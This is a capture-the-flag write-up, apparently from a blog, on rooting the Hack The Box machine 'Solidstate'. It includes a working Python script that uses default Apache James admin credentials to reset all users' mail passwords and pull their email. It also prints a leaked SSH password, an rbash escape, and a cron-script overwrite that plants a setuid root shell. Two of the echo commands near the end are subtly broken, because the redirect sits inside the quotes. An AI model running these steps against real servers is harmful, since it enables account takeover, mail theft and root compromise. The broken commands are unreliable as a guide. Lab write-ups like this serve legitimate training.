---
layout: post
title: HTB - Solidstate write up
tag: ctf
---
This box was fairly easy but it had a new technology I’ve never heard of before called “Apache James”.

If you run a basic nmap with all ports, default scripts, service and OS identification like this nmap -p- -A 10.10.10.51 -vv 
you will find the following ports open:
```
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
25/tcp   open  smtp        syn-ack ttl 63 JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.15.125 [10.10.15.125]), 
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        syn-ack ttl 63 JAMES pop3d 2.3.2
119/tcp  open  nntp        syn-ack ttl 63 JAMES nntpd (posting ok)
4555/tcp open  james-admin syn-ack ttl 63 JAMES Remote Admin 2.3.2
```
After a quick google for Apache James 2.3.2 exploits we find this the exploit is able to overwrite/create files such as /etc/bash_completion.d with a payload we specify, I tried this out with no luck, presumably because no one was logged in so th bash completion never triggered.

After studying the exploit I decided to build something to change the smtp passwords of all the users so I could read their email, it look as follows:
```
import telnetlib
import poplib
import email
import os

user = "root"
password = "root"
host = "10.10.10.51"
port = 4555
tn = telnetlib.Telnet(host,port)
tn.read_until("Login id:")
tn.write(user+"\n")
tn.read_until("Password:")
tn.write(password + "\n")
tn.read_until("commands")
tn.write('listusers\n')
user_count_regex = tn.expect([r"Existing accounts \d"])
user_count = user_count_regex[2]
user_count =  int(user_count.split(" ")[2])

user_list = []
for i in range(0, user_count+1):
    current_user = tn.read_until("\n").replace("user: ","")
    current_user = current_user.strip()
    if current_user != "":
        user_list.append(current_user)
for email_user in user_list:
    print "[+] resetting password of " + email_user
    tn.write("setpassword " + email_user + " highjack\n")
    tn.read_until("reset")
    
    mail = poplib.POP3(host)

    #Login to mail server
    mail.user(email_user)
    mail.pass_("highjack")

    #Get the number of mail messages
    numMessages = len(mail.list()[1])

    print "[+] found %d messages for %s" % (numMessages, email_user)
    current_folder =  os.getcwd()
    print "[+] saving emails to " + current_folder + "/" + email_user
    try:
        os.makedirs(email_user)
    except:
        pass
    for i in range(numMessages):
        for j in mail.retr(i+1)[1]:
            msg = email.message_from_string(j)
            fp = open(email_user+"/"+str(i)+".txt","a")
            fp.write(msg.get_payload())
            fp.close()
```
When we run the script we get the following output:
```
[root:~/notes]# python change-passwords.py
[+] resetting password of james
[+] found 0 messages for james
[+] saving emails to /media/sf_shared/notes/james
[+] resetting password of ../../../../../../../../etc/bash_completion.d
[+] found 7 messages for ../../../../../../../../etc/bash_completion.d
[+] saving emails to /media/sf_shared/notes/../../../../../../../../etc/bash_completion.d
[+] resetting password of thomas
[+] found 0 messages for thomas
[+] saving emails to /media/sf_shared/notes/thomas
[+] resetting password of john
[+] found 1 messages for john
[+] saving emails to /media/sf_shared/notes/john
[+] resetting password of mindy
[+] found 2 messages for mindy
[+] saving emails to /media/sf_shared/notes/mindy
[+] resetting password of mailadmin
[+] found 0 messages for mailadmin
[+] saving emails to /media/sf_shared/notes/mailadmin
[+] resetting password of /../../../../../../../etc/bash_completion.d
[+] found 5 messages for /../../../../../../../etc/bash_completion.d
[+] saving emails to /media/sf_shared/notes//../../../../../../../etc/bash_completion.d
```
Browsing through the downloaded emails we find interesting information included Mindy’s credentials:
```
[root:~/notes/john]# cat 0.txt 
John, Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.Thank you in advance.Respectfully,James#

[root:~/notes/mindy]# cat 0.txt 
Dear Mindy,Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.We are looking forward to you joining our team and your success at Solid State Security. Respectfully,James

[root:~/notes/mindy]# cat 1.txt
Dear Mindy,Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. Respectfully,James

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```
After logging into ssh as Mindy, we notice that the shell is restrictive bash, luckily for us it’s pretty easy to bypass it:
```
mindy@solidstate:~$ echo $SHELL
/bin/rbash

[root:/media/sf_shared/notes]# ssh mindy@10.10.10.51 bash
mindy@10.10.10.51's password: 
python -c 'import pty; pty.spawn("/bin/bash")'  
mindy@solidstate:~$ 
```
While trying to elevate privileges I found a writable file at /opt/tmp.py it’s owned by root and based on the content it looks like the kind of script that would run as a cron to clear out tmp.
```
mindy@solidstate:~$ find / -writable -type f 2>/dev/null  
/opt/tmp.py

mindy@solidstate:~$ ls -al /opt/tmp.py
ls -al /opt/tmp.py
-rwxrwxrwx 1 root root 136 Jan 26 17:32 /opt/tmp.py
```
All /opt/tmp.py is wipe out the contents of /tmp this looks like the type of behavior you’d expect in a cronjob, so it makes sense to try to overwrite it with our own script:
```
echo 'import os' > /opt/tmp.py
echo 'os.system("cp /bin/sh /tmp/highjack") >> /opt/tmp.py'
echo 'os.system("chmod 4755 /tmp/highjack") >> /opt/tmp.py'
```
Now we just need to wait for the cronjob to trigger and run our new shell to get root:
```
mindy@solidstate:~$ /tmp/highjack
/tmp/highjack
# id
id
uid=1001(mindy) gid=1001(mindy) euid=0(root) groups=1001(mindy)
# whoami
whoami
root
```


